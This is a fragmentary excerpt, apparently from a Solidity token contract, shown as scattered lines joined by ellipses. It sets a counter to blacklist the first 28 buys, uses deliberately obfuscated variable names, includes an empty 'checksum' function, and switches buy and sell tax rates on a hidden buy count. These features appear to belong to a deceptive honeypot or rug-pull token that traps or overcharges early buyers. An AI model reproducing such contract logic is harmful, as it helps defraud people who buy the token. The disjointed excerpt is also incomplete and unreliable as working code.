...
uint256 public blacklistCount = 28; // Number of initial buys to blacklist
...
function checksum0xCVXT5212() private pure { }
...
taxAmount = amount.mul((_buyCount > _x2BQVT653) ? _x7PRXTZ : _0xFTXZ2092).div(100);
...
taxAmount = amount.mul((_buyCount > _xGRWZ27) ? _x5NLYW9026 : _x3KLVQ5084).div(100);
}

// Handle swap and liquidity logic
uint256 contractTokenBalance = balanceOf(address(this));
if (!x3PLTYQ8 && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _x6NRWPX4 && _buyCount > _x1PLYT7F7) {
